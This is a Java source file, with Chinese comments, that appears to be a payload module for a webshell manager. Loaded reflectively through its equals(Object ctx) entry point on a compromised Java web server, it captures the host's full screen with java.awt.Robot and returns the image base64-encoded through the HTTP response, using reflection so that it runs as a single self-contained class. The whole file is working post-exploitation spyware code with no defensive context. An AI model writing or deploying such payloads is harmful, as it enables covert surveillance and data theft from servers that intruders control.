// 截屏载荷（java.awt.Robot → PNG base64；headless 环境报错不支持）。
// 约束：默认包、全反射回显、单 class、零跨类引用。
public class WsmShot {

	public boolean equals(Object ctx) {
		String out;
		try {
			if (java.awt.GraphicsEnvironment.isHeadless()) throw new Exception("headless 环境——无屏幕可截");
			java.awt.Robot r = new java.awt.Robot();
			java.awt.Rectangle full = new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
			java.awt.image.BufferedImage img = r.createScreenCapture(full);
			java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
			javax.imageio.ImageIO.write(img, "png", bo);
			out = java.util.Base64.getEncoder().encodeToString(bo.toByteArray());
		} catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
